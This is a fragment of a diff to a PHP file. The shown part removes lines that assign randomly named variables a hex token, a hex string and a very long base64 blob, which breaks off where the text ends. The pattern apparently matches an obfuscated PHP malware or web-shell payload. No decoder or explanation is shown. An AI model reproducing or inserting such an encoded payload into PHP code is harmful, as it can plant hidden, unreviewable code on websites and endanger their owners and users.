@@ -1,24 +1,2563 @@
 <?php
-$toknisd="2c71f35a35d79675854bab2d9c288925";
-$emgfxlyu="575003015f0a5604025302010d0654040901005b590156510055025c080c0b03";
-$kwsrkfam="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